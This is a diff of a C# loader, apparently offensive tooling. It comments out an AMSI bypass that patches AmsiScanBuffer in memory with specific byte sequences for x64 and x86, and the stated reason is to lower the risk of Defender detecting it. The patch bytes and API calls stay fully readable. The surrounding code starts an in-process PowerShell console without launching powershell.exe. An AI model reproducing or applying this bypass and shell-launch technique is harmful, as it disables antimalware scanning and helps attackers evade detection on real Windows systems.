@@ -45,24 +45,25 @@ namespace loader
 
             // Before we start powershell, we nullify AmsiScanBuffer as well. This ensures AMSI doesn't plague
             // us in our new shell.
-            var amsi = LoadLibrary("amsi.dll");
-            var AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
-            VirtualProtect(AmsiScanBuffer, new UIntPtr(8), 0x40, out lpflOldProtect);
+            // Commenting to reduce risk of Defender
+            // var amsi = LoadLibrary("amsi.dll");
+            // var AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
+            // VirtualProtect(AmsiScanBuffer, new UIntPtr(8), 0x40, out lpflOldProtect);
 
             // Stolen from https://github.com/rasta-mouse/AmsiScanBufferBypass
             // On x86, Windows uses __stdcall, which is callee cleanup, whereas 64-bit uses Microsoft x64 calling convention
             // which is caller cleanup. If we don't use the right one, we will get a stack alignment error.
-            if (System.IntPtr.Size == 8)
-            {
+            // if (System.IntPtr.Size == 8)
+            // {
                 // mov eax,E_INVALIDARG
                 // ret
-                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, AmsiScanBuffer, 6);
-            } else
-            {
+            //     Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, AmsiScanBuffer, 6);
+            // } else
+            // {
                 // mov eax,E_INVALIDARG
                 // ret 18
-                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, AmsiScanBuffer, 8);
-            }
+            //     Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, AmsiScanBuffer, 8);
+            // }
 
             // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
             Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
